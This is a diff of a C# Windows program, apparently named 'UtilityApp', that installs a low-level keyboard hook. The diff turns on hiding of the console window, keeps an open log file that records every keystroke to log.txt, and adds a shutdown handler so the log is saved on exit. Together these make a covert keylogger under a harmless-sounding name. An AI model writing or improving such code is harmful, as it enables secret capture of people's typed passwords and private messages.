@@ -16,15 +16,19 @@ namespace UtilityApp
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
+        private static StreamWriter sw;
 
         public void Run()
         {
             var handle = GetConsoleWindow();
 
             //Hide
-            //ShowWindow(handle, SW_HIDE);
+            ShowWindow(handle, SW_HIDE);
 
             _hookID = SetHook(_proc);
+            //Creates writer
+            sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
+            SetConsoleCtrlHandler(new HandlerRoutine(ConsoleCtrlCheck), true);
             Application.Run();
             UnhookWindowsHookEx(_hookID);
         }
@@ -61,7 +65,6 @@ namespace UtilityApp
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                //Console.WriteLine((Keys)vkCode);
                 KeysConverter kc = new KeysConverter();
                 string output = "";
 
@@ -95,10 +98,8 @@ namespace UtilityApp
                     output = kc.ConvertToString((Keys)vkCode).ToLower();
                 }
                 Console.WriteLine(output);
-                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
+                
                 sw.Write(output);
-                //sw.Write(kc.ConvertToString((Keys)vkCode));
-                sw.Close();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
@@ -125,5 +126,25 @@ namespace UtilityApp
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
         const int SW_HIDE = 0;
+
+        [DllImport("Kernel32")]
+        public static extern bool SetConsoleCtrlHandler(HandlerRoutine Handler, bool Add);
+
+        public delegate bool HandlerRoutine(CtrlTypes CtrlType);
+
+        public enum CtrlTypes
+        {
+            CTRL_C_EVENT = 0,
+            CTRL_BREAK_EVENT,
+            CTRL_CLOSE_EVENT,
+            CTRL_LOGOFF_EVENT = 5,
+            CTRL_SHUTDOWN_EVENT
+        }
+
+        private static bool ConsoleCtrlCheck(CtrlTypes ctrlType)
+        {
+            sw.Close();
+            return true;
+        }
     }
 }
